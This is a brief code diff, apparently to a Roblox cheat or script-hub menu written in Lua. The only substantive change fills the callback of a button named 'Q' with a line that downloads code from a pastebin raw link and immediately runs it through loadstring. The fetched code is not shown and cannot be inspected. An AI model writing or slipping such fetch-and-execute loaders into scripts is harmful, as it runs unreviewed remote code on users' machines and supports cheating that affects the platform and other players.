@@ -863,7 +863,7 @@ AddButton(Main, {
 AddButton(Main, {
   Name = "Q",
   Callback = function()
-    
+    loadstring(game:HttpGet("https://pastebin.com/raw/WqPxv3YD"))()
   end
 })
 local Main = MakeTab({Name = "Players"})
